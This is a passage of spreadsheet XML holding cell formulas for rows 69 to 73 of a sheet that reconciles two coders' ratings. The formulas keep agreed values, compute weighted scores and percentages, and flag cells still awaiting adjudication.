        <f>IF(AND(Coder1!AG69&amp;""&lt;&gt;"",Coder1!AG69&amp;""=Coder2!AG69&amp;""),Coder1!AG69,"")</f>
        <v/>
      </c>
      <c r="AH69" s="14">
        <f>IF(AND(Coder1!AH69&amp;""&lt;&gt;"",Coder1!AH69&amp;""=Coder2!AH69&amp;""),Coder1!AH69,"")</f>
        <v/>
      </c>
      <c r="AI69" s="11">
        <f>IF(COUNT(E69:L69)=0,"",SUM(E69:L69))</f>
        <v/>
      </c>
      <c r="AJ69" s="11">
        <f>IF(AI69="","",N(E69)*3+N(F69)*2+N(G69)*2+N(H69)*2+N(I69)*2+N(J69)*3+N(K69)*3+N(L69)*3)</f>
        <v/>
      </c>
      <c r="AK69" s="11">
        <f>IF(AI69="","",COUNTIF(N69:AG69,1))</f>
        <v/>
      </c>
      <c r="AL69" s="11">
        <f>IF(OR(AJ69="",AJ69=0),"",ROUND(100*(AJ69-AK69)/AJ69,1))</f>
        <v/>
      </c>
      <c r="AM69" s="11">
        <f>IF(AND(Coder1!AN69=1,Coder2!AN69=1),IF(COUNTBLANK(E69:AH69)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN69" s="11">
        <f>IF(AND(Coder1!AN69=1,Coder2!AN69=1),IF(SUMPRODUCT(--(Coder1!E69:AH69&amp;""&lt;&gt;Coder2!E69:AH69&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO69" s="11" t="n"/>
    </row>
    <row r="70">
      <c r="A70" s="11">
        <f>Coder1!A70</f>
        <v/>
      </c>
      <c r="B70" s="11">
        <f>Coder1!B70</f>
        <v/>
      </c>
      <c r="C70" s="11">
        <f>Coder1!C70</f>
        <v/>
      </c>
      <c r="D70" s="11">
        <f>Coder1!D70</f>
        <v/>
      </c>
      <c r="E70" s="14">
        <f>IF(AND(Coder1!E70&amp;""&lt;&gt;"",Coder1!E70&amp;""=Coder2!E70&amp;""),Coder1!E70,"")</f>
        <v/>
      </c>
      <c r="F70" s="14">
        <f>IF(AND(Coder1!F70&amp;""&lt;&gt;"",Coder1!F70&amp;""=Coder2!F70&amp;""),Coder1!F70,"")</f>
        <v/>
      </c>
      <c r="G70" s="14">
        <f>IF(AND(Coder1!G70&amp;""&lt;&gt;"",Coder1!G70&amp;""=Coder2!G70&amp;""),Coder1!G70,"")</f>
        <v/>
      </c>
      <c r="H70" s="14">
        <f>IF(AND(Coder1!H70&amp;""&lt;&gt;"",Coder1!H70&amp;""=Coder2!H70&amp;""),Coder1!H70,"")</f>
        <v/>
      </c>
      <c r="I70" s="14">
        <f>IF(AND(Coder1!I70&amp;""&lt;&gt;"",Coder1!I70&amp;""=Coder2!I70&amp;""),Coder1!I70,"")</f>
        <v/>
      </c>
      <c r="J70" s="14">
        <f>IF(AND(Coder1!J70&amp;""&lt;&gt;"",Coder1!J70&amp;""=Coder2!J70&amp;""),Coder1!J70,"")</f>
        <v/>
      </c>
      <c r="K70" s="14">
        <f>IF(AND(Coder1!K70&amp;""&lt;&gt;"",Coder1!K70&amp;""=Coder2!K70&amp;""),Coder1!K70,"")</f>
        <v/>
      </c>
      <c r="L70" s="14">
        <f>IF(AND(Coder1!L70&amp;""&lt;&gt;"",Coder1!L70&amp;""=Coder2!L70&amp;""),Coder1!L70,"")</f>
        <v/>
      </c>
      <c r="M70" s="14">
        <f>IF(AND(Coder1!M70&amp;""&lt;&gt;"",Coder1!M70&amp;""=Coder2!M70&amp;""),Coder1!M70,"")</f>
        <v/>
      </c>
      <c r="N70" s="14">
        <f>IF(AND(Coder1!N70&amp;""&lt;&gt;"",Coder1!N70&amp;""=Coder2!N70&amp;""),Coder1!N70,"")</f>
        <v/>
      </c>
      <c r="O70" s="14">
        <f>IF(AND(Coder1!O70&amp;""&lt;&gt;"",Coder1!O70&amp;""=Coder2!O70&amp;""),Coder1!O70,"")</f>
        <v/>
      </c>
      <c r="P70" s="14">
        <f>IF(AND(Coder1!P70&amp;""&lt;&gt;"",Coder1!P70&amp;""=Coder2!P70&amp;""),Coder1!P70,"")</f>
        <v/>
      </c>
      <c r="Q70" s="14">
        <f>IF(AND(Coder1!Q70&amp;""&lt;&gt;"",Coder1!Q70&amp;""=Coder2!Q70&amp;""),Coder1!Q70,"")</f>
        <v/>
      </c>
      <c r="R70" s="14">
        <f>IF(AND(Coder1!R70&amp;""&lt;&gt;"",Coder1!R70&amp;""=Coder2!R70&amp;""),Coder1!R70,"")</f>
        <v/>
      </c>
      <c r="S70" s="14">
        <f>IF(AND(Coder1!S70&amp;""&lt;&gt;"",Coder1!S70&amp;""=Coder2!S70&amp;""),Coder1!S70,"")</f>
        <v/>
      </c>
      <c r="T70" s="14">
        <f>IF(AND(Coder1!T70&amp;""&lt;&gt;"",Coder1!T70&amp;""=Coder2!T70&amp;""),Coder1!T70,"")</f>
        <v/>
      </c>
      <c r="U70" s="14">
        <f>IF(AND(Coder1!U70&amp;""&lt;&gt;"",Coder1!U70&amp;""=Coder2!U70&amp;""),Coder1!U70,"")</f>
        <v/>
      </c>
      <c r="V70" s="14">
        <f>IF(AND(Coder1!V70&amp;""&lt;&gt;"",Coder1!V70&amp;""=Coder2!V70&amp;""),Coder1!V70,"")</f>
        <v/>
      </c>
      <c r="W70" s="14">
        <f>IF(AND(Coder1!W70&amp;""&lt;&gt;"",Coder1!W70&amp;""=Coder2!W70&amp;""),Coder1!W70,"")</f>
        <v/>
      </c>
      <c r="X70" s="14">
        <f>IF(AND(Coder1!X70&amp;""&lt;&gt;"",Coder1!X70&amp;""=Coder2!X70&amp;""),Coder1!X70,"")</f>
        <v/>
      </c>
      <c r="Y70" s="14">
        <f>IF(AND(Coder1!Y70&amp;""&lt;&gt;"",Coder1!Y70&amp;""=Coder2!Y70&amp;""),Coder1!Y70,"")</f>
        <v/>
      </c>
      <c r="Z70" s="14">
        <f>IF(AND(Coder1!Z70&amp;""&lt;&gt;"",Coder1!Z70&amp;""=Coder2!Z70&amp;""),Coder1!Z70,"")</f>
        <v/>
      </c>
      <c r="AA70" s="14">
        <f>IF(AND(Coder1!AA70&amp;""&lt;&gt;"",Coder1!AA70&amp;""=Coder2!AA70&amp;""),Coder1!AA70,"")</f>
        <v/>
      </c>
      <c r="AB70" s="14">
        <f>IF(AND(Coder1!AB70&amp;""&lt;&gt;"",Coder1!AB70&amp;""=Coder2!AB70&amp;""),Coder1!AB70,"")</f>
        <v/>
      </c>
      <c r="AC70" s="14">
        <f>IF(AND(Coder1!AC70&amp;""&lt;&gt;"",Coder1!AC70&amp;""=Coder2!AC70&amp;""),Coder1!AC70,"")</f>
        <v/>
      </c>
      <c r="AD70" s="14">
        <f>IF(AND(Coder1!AD70&amp;""&lt;&gt;"",Coder1!AD70&amp;""=Coder2!AD70&amp;""),Coder1!AD70,"")</f>
        <v/>
      </c>
      <c r="AE70" s="14">
        <f>IF(AND(Coder1!AE70&amp;""&lt;&gt;"",Coder1!AE70&amp;""=Coder2!AE70&amp;""),Coder1!AE70,"")</f>
        <v/>
      </c>
      <c r="AF70" s="14">
        <f>IF(AND(Coder1!AF70&amp;""&lt;&gt;"",Coder1!AF70&amp;""=Coder2!AF70&amp;""),Coder1!AF70,"")</f>
        <v/>
      </c>
      <c r="AG70" s="14">
        <f>IF(AND(Coder1!AG70&amp;""&lt;&gt;"",Coder1!AG70&amp;""=Coder2!AG70&amp;""),Coder1!AG70,"")</f>
        <v/>
      </c>
      <c r="AH70" s="14">
        <f>IF(AND(Coder1!AH70&amp;""&lt;&gt;"",Coder1!AH70&amp;""=Coder2!AH70&amp;""),Coder1!AH70,"")</f>
        <v/>
      </c>
      <c r="AI70" s="11">
        <f>IF(COUNT(E70:L70)=0,"",SUM(E70:L70))</f>
        <v/>
      </c>
      <c r="AJ70" s="11">
        <f>IF(AI70="","",N(E70)*3+N(F70)*2+N(G70)*2+N(H70)*2+N(I70)*2+N(J70)*3+N(K70)*3+N(L70)*3)</f>
        <v/>
      </c>
      <c r="AK70" s="11">
        <f>IF(AI70="","",COUNTIF(N70:AG70,1))</f>
        <v/>
      </c>
      <c r="AL70" s="11">
        <f>IF(OR(AJ70="",AJ70=0),"",ROUND(100*(AJ70-AK70)/AJ70,1))</f>
        <v/>
      </c>
      <c r="AM70" s="11">
        <f>IF(AND(Coder1!AN70=1,Coder2!AN70=1),IF(COUNTBLANK(E70:AH70)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN70" s="11">
        <f>IF(AND(Coder1!AN70=1,Coder2!AN70=1),IF(SUMPRODUCT(--(Coder1!E70:AH70&amp;""&lt;&gt;Coder2!E70:AH70&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO70" s="11" t="n"/>
    </row>
    <row r="71">
      <c r="A71" s="11">
        <f>Coder1!A71</f>
        <v/>
      </c>
      <c r="B71" s="11">
        <f>Coder1!B71</f>
        <v/>
      </c>
      <c r="C71" s="11">
        <f>Coder1!C71</f>
        <v/>
      </c>
      <c r="D71" s="11">
        <f>Coder1!D71</f>
        <v/>
      </c>
      <c r="E71" s="14">
        <f>IF(AND(Coder1!E71&amp;""&lt;&gt;"",Coder1!E71&amp;""=Coder2!E71&amp;""),Coder1!E71,"")</f>
        <v/>
      </c>
      <c r="F71" s="14">
        <f>IF(AND(Coder1!F71&amp;""&lt;&gt;"",Coder1!F71&amp;""=Coder2!F71&amp;""),Coder1!F71,"")</f>
        <v/>
      </c>
      <c r="G71" s="14">
        <f>IF(AND(Coder1!G71&amp;""&lt;&gt;"",Coder1!G71&amp;""=Coder2!G71&amp;""),Coder1!G71,"")</f>
        <v/>
      </c>
      <c r="H71" s="14">
        <f>IF(AND(Coder1!H71&amp;""&lt;&gt;"",Coder1!H71&amp;""=Coder2!H71&amp;""),Coder1!H71,"")</f>
        <v/>
      </c>
      <c r="I71" s="14">
        <f>IF(AND(Coder1!I71&amp;""&lt;&gt;"",Coder1!I71&amp;""=Coder2!I71&amp;""),Coder1!I71,"")</f>
        <v/>
      </c>
      <c r="J71" s="14">
        <f>IF(AND(Coder1!J71&amp;""&lt;&gt;"",Coder1!J71&amp;""=Coder2!J71&amp;""),Coder1!J71,"")</f>
        <v/>
      </c>
      <c r="K71" s="14">
        <f>IF(AND(Coder1!K71&amp;""&lt;&gt;"",Coder1!K71&amp;""=Coder2!K71&amp;""),Coder1!K71,"")</f>
        <v/>
      </c>
      <c r="L71" s="14">
        <f>IF(AND(Coder1!L71&amp;""&lt;&gt;"",Coder1!L71&amp;""=Coder2!L71&amp;""),Coder1!L71,"")</f>
        <v/>
      </c>
      <c r="M71" s="14">
        <f>IF(AND(Coder1!M71&amp;""&lt;&gt;"",Coder1!M71&amp;""=Coder2!M71&amp;""),Coder1!M71,"")</f>
        <v/>
      </c>
      <c r="N71" s="14">
        <f>IF(AND(Coder1!N71&amp;""&lt;&gt;"",Coder1!N71&amp;""=Coder2!N71&amp;""),Coder1!N71,"")</f>
        <v/>
      </c>
      <c r="O71" s="14">
        <f>IF(AND(Coder1!O71&amp;""&lt;&gt;"",Coder1!O71&amp;""=Coder2!O71&amp;""),Coder1!O71,"")</f>
        <v/>
      </c>
      <c r="P71" s="14">
        <f>IF(AND(Coder1!P71&amp;""&lt;&gt;"",Coder1!P71&amp;""=Coder2!P71&amp;""),Coder1!P71,"")</f>
        <v/>
      </c>
      <c r="Q71" s="14">
        <f>IF(AND(Coder1!Q71&amp;""&lt;&gt;"",Coder1!Q71&amp;""=Coder2!Q71&amp;""),Coder1!Q71,"")</f>
        <v/>
      </c>
      <c r="R71" s="14">
        <f>IF(AND(Coder1!R71&amp;""&lt;&gt;"",Coder1!R71&amp;""=Coder2!R71&amp;""),Coder1!R71,"")</f>
        <v/>
      </c>
      <c r="S71" s="14">
        <f>IF(AND(Coder1!S71&amp;""&lt;&gt;"",Coder1!S71&amp;""=Coder2!S71&amp;""),Coder1!S71,"")</f>
        <v/>
      </c>
      <c r="T71" s="14">
        <f>IF(AND(Coder1!T71&amp;""&lt;&gt;"",Coder1!T71&amp;""=Coder2!T71&amp;""),Coder1!T71,"")</f>
        <v/>
      </c>
      <c r="U71" s="14">
        <f>IF(AND(Coder1!U71&amp;""&lt;&gt;"",Coder1!U71&amp;""=Coder2!U71&amp;""),Coder1!U71,"")</f>
        <v/>
      </c>
      <c r="V71" s="14">
        <f>IF(AND(Coder1!V71&amp;""&lt;&gt;"",Coder1!V71&amp;""=Coder2!V71&amp;""),Coder1!V71,"")</f>
        <v/>
      </c>
      <c r="W71" s="14">
        <f>IF(AND(Coder1!W71&amp;""&lt;&gt;"",Coder1!W71&amp;""=Coder2!W71&amp;""),Coder1!W71,"")</f>
        <v/>
      </c>
      <c r="X71" s="14">
        <f>IF(AND(Coder1!X71&amp;""&lt;&gt;"",Coder1!X71&amp;""=Coder2!X71&amp;""),Coder1!X71,"")</f>
        <v/>
      </c>
      <c r="Y71" s="14">
        <f>IF(AND(Coder1!Y71&amp;""&lt;&gt;"",Coder1!Y71&amp;""=Coder2!Y71&amp;""),Coder1!Y71,"")</f>
        <v/>
      </c>
      <c r="Z71" s="14">
        <f>IF(AND(Coder1!Z71&amp;""&lt;&gt;"",Coder1!Z71&amp;""=Coder2!Z71&amp;""),Coder1!Z71,"")</f>
        <v/>
      </c>
      <c r="AA71" s="14">
        <f>IF(AND(Coder1!AA71&amp;""&lt;&gt;"",Coder1!AA71&amp;""=Coder2!AA71&amp;""),Coder1!AA71,"")</f>
        <v/>
      </c>
      <c r="AB71" s="14">
        <f>IF(AND(Coder1!AB71&amp;""&lt;&gt;"",Coder1!AB71&amp;""=Coder2!AB71&amp;""),Coder1!AB71,"")</f>
        <v/>
      </c>
      <c r="AC71" s="14">
        <f>IF(AND(Coder1!AC71&amp;""&lt;&gt;"",Coder1!AC71&amp;""=Coder2!AC71&amp;""),Coder1!AC71,"")</f>
        <v/>
      </c>
      <c r="AD71" s="14">
        <f>IF(AND(Coder1!AD71&amp;""&lt;&gt;"",Coder1!AD71&amp;""=Coder2!AD71&amp;""),Coder1!AD71,"")</f>
        <v/>
      </c>
      <c r="AE71" s="14">
        <f>IF(AND(Coder1!AE71&amp;""&lt;&gt;"",Coder1!AE71&amp;""=Coder2!AE71&amp;""),Coder1!AE71,"")</f>
        <v/>
      </c>
      <c r="AF71" s="14">
        <f>IF(AND(Coder1!AF71&amp;""&lt;&gt;"",Coder1!AF71&amp;""=Coder2!AF71&amp;""),Coder1!AF71,"")</f>
        <v/>
      </c>
      <c r="AG71" s="14">
        <f>IF(AND(Coder1!AG71&amp;""&lt;&gt;"",Coder1!AG71&amp;""=Coder2!AG71&amp;""),Coder1!AG71,"")</f>
        <v/>
      </c>
      <c r="AH71" s="14">
        <f>IF(AND(Coder1!AH71&amp;""&lt;&gt;"",Coder1!AH71&amp;""=Coder2!AH71&amp;""),Coder1!AH71,"")</f>
        <v/>
      </c>
      <c r="AI71" s="11">
        <f>IF(COUNT(E71:L71)=0,"",SUM(E71:L71))</f>
        <v/>
      </c>
      <c r="AJ71" s="11">
        <f>IF(AI71="","",N(E71)*3+N(F71)*2+N(G71)*2+N(H71)*2+N(I71)*2+N(J71)*3+N(K71)*3+N(L71)*3)</f>
        <v/>
      </c>
      <c r="AK71" s="11">
        <f>IF(AI71="","",COUNTIF(N71:AG71,1))</f>
        <v/>
      </c>
      <c r="AL71" s="11">
        <f>IF(OR(AJ71="",AJ71=0),"",ROUND(100*(AJ71-AK71)/AJ71,1))</f>
        <v/>
      </c>
      <c r="AM71" s="11">
        <f>IF(AND(Coder1!AN71=1,Coder2!AN71=1),IF(COUNTBLANK(E71:AH71)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN71" s="11">
        <f>IF(AND(Coder1!AN71=1,Coder2!AN71=1),IF(SUMPRODUCT(--(Coder1!E71:AH71&amp;""&lt;&gt;Coder2!E71:AH71&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO71" s="11" t="n"/>
    </row>
    <row r="72">
      <c r="A72" s="11">
        <f>Coder1!A72</f>
        <v/>
      </c>
      <c r="B72" s="11">
        <f>Coder1!B72</f>
        <v/>
      </c>
      <c r="C72" s="11">
        <f>Coder1!C72</f>
        <v/>
      </c>
      <c r="D72" s="11">
        <f>Coder1!D72</f>
        <v/>
      </c>
      <c r="E72" s="14">
        <f>IF(AND(Coder1!E72&amp;""&lt;&gt;"",Coder1!E72&amp;""=Coder2!E72&amp;""),Coder1!E72,"")</f>
        <v/>
      </c>
      <c r="F72" s="14">
        <f>IF(AND(Coder1!F72&amp;""&lt;&gt;"",Coder1!F72&amp;""=Coder2!F72&amp;""),Coder1!F72,"")</f>
        <v/>
      </c>
      <c r="G72" s="14">
        <f>IF(AND(Coder1!G72&amp;""&lt;&gt;"",Coder1!G72&amp;""=Coder2!G72&amp;""),Coder1!G72,"")</f>
        <v/>
      </c>
      <c r="H72" s="14">
        <f>IF(AND(Coder1!H72&amp;""&lt;&gt;"",Coder1!H72&amp;""=Coder2!H72&amp;""),Coder1!H72,"")</f>
        <v/>
      </c>
      <c r="I72" s="14">
        <f>IF(AND(Coder1!I72&amp;""&lt;&gt;"",Coder1!I72&amp;""=Coder2!I72&amp;""),Coder1!I72,"")</f>
        <v/>
      </c>
      <c r="J72" s="14">
        <f>IF(AND(Coder1!J72&amp;""&lt;&gt;"",Coder1!J72&amp;""=Coder2!J72&amp;""),Coder1!J72,"")</f>
        <v/>
      </c>
      <c r="K72" s="14">
        <f>IF(AND(Coder1!K72&amp;""&lt;&gt;"",Coder1!K72&amp;""=Coder2!K72&amp;""),Coder1!K72,"")</f>
        <v/>
      </c>
      <c r="L72" s="14">
        <f>IF(AND(Coder1!L72&amp;""&lt;&gt;"",Coder1!L72&amp;""=Coder2!L72&amp;""),Coder1!L72,"")</f>
        <v/>
      </c>
      <c r="M72" s="14">
        <f>IF(AND(Coder1!M72&amp;""&lt;&gt;"",Coder1!M72&amp;""=Coder2!M72&amp;""),Coder1!M72,"")</f>
        <v/>
      </c>
      <c r="N72" s="14">
        <f>IF(AND(Coder1!N72&amp;""&lt;&gt;"",Coder1!N72&amp;""=Coder2!N72&amp;""),Coder1!N72,"")</f>
        <v/>
      </c>
      <c r="O72" s="14">
        <f>IF(AND(Coder1!O72&amp;""&lt;&gt;"",Coder1!O72&amp;""=Coder2!O72&amp;""),Coder1!O72,"")</f>
        <v/>
      </c>
      <c r="P72" s="14">
        <f>IF(AND(Coder1!P72&amp;""&lt;&gt;"",Coder1!P72&amp;""=Coder2!P72&amp;""),Coder1!P72,"")</f>
        <v/>
      </c>
      <c r="Q72" s="14">
        <f>IF(AND(Coder1!Q72&amp;""&lt;&gt;"",Coder1!Q72&amp;""=Coder2!Q72&amp;""),Coder1!Q72,"")</f>
        <v/>
      </c>
      <c r="R72" s="14">
        <f>IF(AND(Coder1!R72&amp;""&lt;&gt;"",Coder1!R72&amp;""=Coder2!R72&amp;""),Coder1!R72,"")</f>
        <v/>
      </c>
      <c r="S72" s="14">
        <f>IF(AND(Coder1!S72&amp;""&lt;&gt;"",Coder1!S72&amp;""=Coder2!S72&amp;""),Coder1!S72,"")</f>
        <v/>
      </c>
      <c r="T72" s="14">
        <f>IF(AND(Coder1!T72&amp;""&lt;&gt;"",Coder1!T72&amp;""=Coder2!T72&amp;""),Coder1!T72,"")</f>
        <v/>
      </c>
      <c r="U72" s="14">
        <f>IF(AND(Coder1!U72&amp;""&lt;&gt;"",Coder1!U72&amp;""=Coder2!U72&amp;""),Coder1!U72,"")</f>
        <v/>
      </c>
      <c r="V72" s="14">
        <f>IF(AND(Coder1!V72&amp;""&lt;&gt;"",Coder1!V72&amp;""=Coder2!V72&amp;""),Coder1!V72,"")</f>
        <v/>
      </c>
      <c r="W72" s="14">
        <f>IF(AND(Coder1!W72&amp;""&lt;&gt;"",Coder1!W72&amp;""=Coder2!W72&amp;""),Coder1!W72,"")</f>
        <v/>
      </c>
      <c r="X72" s="14">
        <f>IF(AND(Coder1!X72&amp;""&lt;&gt;"",Coder1!X72&amp;""=Coder2!X72&amp;""),Coder1!X72,"")</f>
        <v/>
      </c>
      <c r="Y72" s="14">
        <f>IF(AND(Coder1!Y72&amp;""&lt;&gt;"",Coder1!Y72&amp;""=Coder2!Y72&amp;""),Coder1!Y72,"")</f>
        <v/>
      </c>
      <c r="Z72" s="14">
        <f>IF(AND(Coder1!Z72&amp;""&lt;&gt;"",Coder1!Z72&amp;""=Coder2!Z72&amp;""),Coder1!Z72,"")</f>
        <v/>
      </c>
      <c r="AA72" s="14">
        <f>IF(AND(Coder1!AA72&amp;""&lt;&gt;"",Coder1!AA72&amp;""=Coder2!AA72&amp;""),Coder1!AA72,"")</f>
        <v/>
      </c>
      <c r="AB72" s="14">
        <f>IF(AND(Coder1!AB72&amp;""&lt;&gt;"",Coder1!AB72&amp;""=Coder2!AB72&amp;""),Coder1!AB72,"")</f>
        <v/>
      </c>
      <c r="AC72" s="14">
        <f>IF(AND(Coder1!AC72&amp;""&lt;&gt;"",Coder1!AC72&amp;""=Coder2!AC72&amp;""),Coder1!AC72,"")</f>
        <v/>
      </c>
      <c r="AD72" s="14">
        <f>IF(AND(Coder1!AD72&amp;""&lt;&gt;"",Coder1!AD72&amp;""=Coder2!AD72&amp;""),Coder1!AD72,"")</f>
        <v/>
      </c>
      <c r="AE72" s="14">
        <f>IF(AND(Coder1!AE72&amp;""&lt;&gt;"",Coder1!AE72&amp;""=Coder2!AE72&amp;""),Coder1!AE72,"")</f>
        <v/>
      </c>
      <c r="AF72" s="14">
        <f>IF(AND(Coder1!AF72&amp;""&lt;&gt;"",Coder1!AF72&amp;""=Coder2!AF72&amp;""),Coder1!AF72,"")</f>
        <v/>
      </c>
      <c r="AG72" s="14">
        <f>IF(AND(Coder1!AG72&amp;""&lt;&gt;"",Coder1!AG72&amp;""=Coder2!AG72&amp;""),Coder1!AG72,"")</f>
        <v/>
      </c>
      <c r="AH72" s="14">
        <f>IF(AND(Coder1!AH72&amp;""&lt;&gt;"",Coder1!AH72&amp;""=Coder2!AH72&amp;""),Coder1!AH72,"")</f>
        <v/>
      </c>
      <c r="AI72" s="11">
        <f>IF(COUNT(E72:L72)=0,"",SUM(E72:L72))</f>
        <v/>
      </c>
      <c r="AJ72" s="11">
        <f>IF(AI72="","",N(E72)*3+N(F72)*2+N(G72)*2+N(H72)*2+N(I72)*2+N(J72)*3+N(K72)*3+N(L72)*3)</f>
        <v/>
      </c>
      <c r="AK72" s="11">
        <f>IF(AI72="","",COUNTIF(N72:AG72,1))</f>
        <v/>
      </c>
      <c r="AL72" s="11">
        <f>IF(OR(AJ72="",AJ72=0),"",ROUND(100*(AJ72-AK72)/AJ72,1))</f>
        <v/>
      </c>
      <c r="AM72" s="11">
        <f>IF(AND(Coder1!AN72=1,Coder2!AN72=1),IF(COUNTBLANK(E72:AH72)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN72" s="11">
        <f>IF(AND(Coder1!AN72=1,Coder2!AN72=1),IF(SUMPRODUCT(--(Coder1!E72:AH72&amp;""&lt;&gt;Coder2!E72:AH72&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO72" s="11" t="n"/>
    </row>
    <row r="73">
      <c r="A73" s="11">
        <f>Coder1!A73</f>
        <v/>
      </c>
      <c r="B73" s="11">
        <f>Coder1!B73</f>
        <v/>
      </c>
      <c r="C73" s="11">
        <f>Coder1!C73</f>
        <v/>
      </c>
      <c r="D73" s="11">
        <f>Coder1!D73</f>
        <v/>
      </c>
      <c r="E73" s="14">
        <f>IF(AND(Coder1!E73&amp;""&lt;&gt;"",Coder1!E73&amp;""=Coder2!E73&amp;""),Coder1!E73,"")</f>
        <v/>
      </c>
      <c r="F73" s="14">
        <f>IF(AND(Coder1!F73&amp;""&lt;&gt;"",Coder1!F73&amp;""=Coder2!F73&amp;""),Coder1!F73,"")</f>
        <v/>
      </c>
      <c r="G73" s="14">
        <f>IF(AND(Coder1!G73&amp;""&lt;&gt;"",Coder1!G73&amp;""=Coder2!G73&amp;""),Coder1!G73,"")</f>
        <v/>
      </c>
      <c r="H73" s="14">
        <f>IF(AND(Coder1!H73&amp;""&lt;&gt;"",Coder1!H73&amp;""=Coder2!H73&amp;""),Coder1!H73,"")</f>
        <v/>
      </c>
      <c r="I73" s="14">
        <f>IF(AND(Coder1!I73&amp;""&lt;&gt;"",Coder1!I73&amp;""=Coder2!I73&amp;""),Coder1!I73,"")</f>
        <v/>
      </c>
      <c r="J73" s="14">
        <f>IF(AND(Coder1!J73&amp;""&lt;&gt;"",Coder1!J73&amp;""=Coder2!J73&amp;""),Coder1!J73,"")</f>
        <v/>
      </c>
      <c r="K73" s="14">
        <f>IF(AND(Coder1!K73&amp;""&lt;&gt;"",Coder1!K73&amp;""=Coder2!K73&amp;""),Coder1!K73,"")</f>
        <v/>
      </c>
      <c r="L73" s="14">
        <f>IF(AND(Coder1!L73&amp;""&lt;&gt;"",Coder1!L73&amp;""=Coder2!L73&amp;""),Coder1!L73,"")</f>
        <v/>
      </c>
      <c r="M73" s="14">
        <f>IF(AND(Coder1!M73&amp;""&lt;&gt;"",Coder1!M73&amp;""=Coder2!M73&amp;""),Coder1!M73,"")</f>
        <v/>
      </c>
      <c r="N73" s="14">
        <f>IF(AND(Coder1!N73&amp;""&lt;&gt;"",Coder1!N73&amp;""=Coder2!N73&amp;""),Coder1!N73,"")</f>
        <v/>
      </c>
      <c r="O73" s="14">
        <f>IF(AND(Coder1!O73&amp;""&lt;&gt;"",Coder1!O73&amp;""=Coder2!O73&amp;""),Coder1!O73,"")</f>
        <v/>
      </c>
      <c r="P73" s="14">
        <f>IF(AND(Coder1!P73&amp;""&lt;&gt;"",Coder1!P73&amp;""=Coder2!P73&amp;""),Coder1!P73,"")</f>
        <v/>
      </c>
      <c r="Q73" s="14">
        <f>IF(AND(Coder1!Q73&amp;""&lt;&gt;"",Coder1!Q73&amp;""=Coder2!Q73&amp;""),Coder1!Q73,"")</f>
        <v/>
      </c>
      <c r="R73" s="14">
        <f>IF(AND(Coder1!R73&amp;""&lt;&gt;"",Coder1!R73&amp;""=Coder2!R73&amp;""),Coder1!R73,"")</f>
        <v/>
      </c>
      <c r="S73" s="14">
        <f>IF(AND(Coder1!S73&amp;""&lt;&gt;"",Coder1!S73&amp;""=Coder2!S73&amp;""),Coder1!S73,"")</f>
        <v/>
      </c>
      <c r="T73" s="14">
        <f>IF(AND(Coder1!T73&amp;""&lt;&gt;"",Coder1!T73&amp;""=Coder2!T73&amp;""),Coder1!T73,"")</f>
        <v/>
      </c>
      <c r="U73" s="14">
        <f>IF(AND(Coder1!U73&amp;""&lt;&gt;"",Coder1!U73&amp;""=Coder2!U73&amp;""),Coder1!U73,"")</f>
        <v/>
      </c>
      <c r="V73" s="14">
        <f>IF(AND(Coder1!V73&amp;""&lt;&gt;"",Coder1!V73&amp;""=Coder2!V73&amp;""),Coder1!V73,"")</f>
        <v/>
      </c>
      <c r="W73" s="14">
        <f>IF(AND(Coder1!W73&amp;""&lt;&gt;"",Coder1!W73&amp;""=Coder2!W73&amp;""),Coder1!W73,"")</f>
        <v/>
      </c>
      <c r="X73" s="14">
        <f>IF(AND(Coder1!X73&amp;""&lt;&gt;"",Coder1!X73&amp;""=Coder2!X73&amp;""),Coder1!X73,"")</f>
        <v/>
      </c>
      <c r="Y73" s="14">
        <f>IF(AND(Coder1!Y73&amp;""&lt;&gt;"",Coder1!Y73&amp;""=Coder2!Y73&amp;""),Coder1!Y73,"")</f>
        <v/>
      </c>
      <c r="Z73" s="14">
        <f>IF(AND(Coder1!Z73&amp;""&lt;&gt;"",Coder1!Z73&amp;""=Coder2!Z73&amp;""),Coder1!Z73,"")</f>
        <v/>
      </c>
      <c r="AA73" s="14">
        <f>IF(AND(Coder1!AA73&amp;""&lt;&gt;"",Coder1!AA73&amp;""=Coder2!AA73&amp;""),Coder1!AA73,"")</f>
        <v/>
      </c>
      <c r="AB73" s="14">
        <f>IF(AND(Coder1!AB73&amp;""&lt;&gt;"",Coder1!AB73&amp;""=Coder2!AB73&amp;""),Coder1!AB73,"")</f>
        <v/>
      </c>
      <c r="AC73" s="14">
        <f>IF(AND(Coder1!AC73&amp;""&lt;&gt;"",Coder1!AC73&amp;""=Coder2!AC73&amp;""),Coder1!AC73,"")</f>
        <v/>
      </c>
      <c r="AD73" s="14">
        <f>IF(AND(Coder1!AD73&amp;""&lt;&gt;"",Coder1!AD73&amp;""=Coder2!AD73&amp;""),Coder1!AD73,"")</f>
        <v/>
      </c>
      <c r="AE73" s="14">
        <f>IF(AND(Coder1!AE73&amp;""&lt;&gt;"",Coder1!AE73&amp;""=Coder2!AE73&amp;""),Coder1!AE73,"")</f>
        <v/>
      </c>
      <c r="AF73" s="14">
        <f>IF(AND(Coder1!AF73&amp;""&lt;&gt;"",Coder1!AF73&amp;""=Coder2!AF73&amp;""),Coder1!AF73,"")</f>
        <v/>
      </c>
      <c r="AG73" s="14">
        <f>IF(AND(Coder1!AG73&amp;""&lt;&gt;"",Coder1!AG73&amp;""=Coder2!AG73&amp;""),Coder1!AG73,"")</f>
        <v/>
      </c>
      <c r="AH73" s="14">
        <f>IF(AND(Coder1!AH73&amp;""&lt;&gt;"",Coder1!AH73&amp;""=Coder2!AH73&amp;""),Coder1!AH73,"")</f>
        <v/>
      </c>
      <c r="AI73" s="11">
        <f>IF(COUNT(E73:L73)=0,"",SUM(E73:L73))</f>
        <v/>
      </c>
      <c r="AJ73" s="11">
